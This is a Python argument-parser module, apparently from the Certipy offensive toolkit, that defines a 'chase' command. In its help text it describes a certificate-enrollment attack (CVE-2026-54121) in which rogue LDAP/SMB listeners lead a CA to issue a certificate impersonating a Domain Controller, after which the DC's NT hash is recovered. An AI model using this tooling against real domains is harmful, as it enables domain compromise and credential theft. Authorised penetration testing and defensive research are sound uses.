"""
Parser for the 'chase' command (CVE-2026-54121 / Certighost).

This module defines the command-line interface for the 'chase' command, which
abuses the AD CS certificate-enrollment "cdc chase" fallback. A low-privileged
domain user makes the Certification Authority resolve Domain Controller identity
data from an attacker-controlled host (the 'cdc' request attribute) for a named
DC principal (the 'rmd' request attribute), yielding a certificate that
impersonates the Domain Controller.
"""

import argparse
from typing import Callable, Tuple

from . import target

# Command name identifier
NAME = "chase"


def entry(options: argparse.Namespace) -> None:
    """
    Entry point for the chase command.

    This function imports and calls the actual implementation of the chase
    command from the certipy.commands module.

    Args:
        options: Parsed command-line arguments
    """
    from certipy.commands import chase

    chase.entry(options)


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:  # type: ignore
    """
    Add the chase command subparser to the main parser.

    This function creates and configures a subparser for the chase command,
    exposing the options that drive the CVE-2026-54121 cdc-chase attack.

    Args:
        subparsers: Parent parser to attach the subparser to

    Returns:
        Tuple of (command_name, entry_function) for command registration
    """
    # Create the chase subparser with description
    subparser = subparsers.add_parser(
        NAME,
        help="Impersonate a DC via the AD CS cdc-chase (CVE-2026-54121)",
        description=(
            "Exploit the AD CS certificate-enrollment 'cdc chase' fallback "
            "(CVE-2026-54121 / Certighost). Certipy creates a machine account, "
            "starts a rogue DC-identity oracle (LDAP + SMB/LSA) and submits a "
            "certificate request whose 'cdc' attribute points the CA back at the "
            "rogue oracle for a target DC principal ('rmd'). The CA issues a "
            "certificate for the Domain Controller, which is then used for PKINIT "
            "to recover the DC's NT hash."
        ),
    )

    # CA name (optional, auto-discovered)
    subparser.add_argument(
        "-ca",
        action="store",
        metavar="certificate authority name",
        help="Name of the Certificate Authority (default: auto-discovered)",
    )

    # Chase-specific options
    chase_group = subparser.add_argument_group("chase options")
    chase_group.add_argument(
        "-template",
        action="store",
        metavar="template name",
        default="Machine",
        help=(
            "Certificate template to request. Must build the subject from AD / "
            "DNS name flags to trigger the chase (default: Machine)"
        ),
    )
    chase_group.add_argument(
        "-target-account",
        action="store",
        metavar="dc account",
        help=(
            "Computer account to impersonate, e.g. 'DC01$' "
            "(default: auto-discovered Domain Controller)"
        ),
    )
    chase_group.add_argument(
        "-listener",
        action="store",
        metavar="ip address",
        help=(
            "Attacker IP the CA is told to chase (cdc). Also the bind hint for "
            "the rogue listeners (default: auto-detected)"
        ),
    )
    chase_group.add_argument(
        "-out",
        action="store",
        metavar="output file name",
        help="Path to save the issued DC certificate and private key (PFX)",
    )
    chase_group.add_argument(
        "-server-only",
        action="store_true",
        help=(
            "Only start the rogue DC-identity oracle and print the matching "
            "'certipy req' command, instead of running the full attack"
        ),
    )
    chase_group.add_argument(
        "-no-pkinit",
        action="store_true",
        help="Stop after obtaining the DC certificate; skip PKINIT / NT hash recovery",
    )

    # Machine-account options
    account_group = subparser.add_argument_group("machine account options")
    account_group.add_argument(
        "-computer-name",
        action="store",
        metavar="account",
        help="Reuse an existing computer account instead of creating a new one",
    )
    account_group.add_argument(
        "-computer-pass",
        action="store",
        metavar="password",
        help="Password for -computer-name",
    )
    account_group.add_argument(
        "-computer-hash",
        action="store",
        metavar="nt hash",
        help="NT hash for -computer-name (alternative to -computer-pass)",
    )

    # Rogue listener options
    rogue_group = subparser.add_argument_group("rogue listener options")
    rogue_group.add_argument(
        "-rogue-smb-port",
        action="store",
        metavar="port",
        type=int,
        default=445,
        help="Port for the rogue SMB/LSA listener (default: 445)",
    )
    rogue_group.add_argument(
        "-rogue-ldap-port",
        action="store",
        metavar="port",
        type=int,
        default=389,
        help="Port for the rogue LDAP listener (default: 389)",
    )

    # Certificate request transport
    connection_group = subparser.add_argument_group("request connection options")
    connection_group.add_argument(
        "-web",
        action="store_true",
        help="Submit the certificate request via Web Enrollment instead of RPC",
    )
    connection_group.add_argument(
        "-dcom",
        action="store_true",
        help="Submit the certificate request via DCOM instead of RPC",
    )

    # Add standard target arguments
    target.add_argument_group(subparser, connection_options=connection_group)

    return NAME, entry
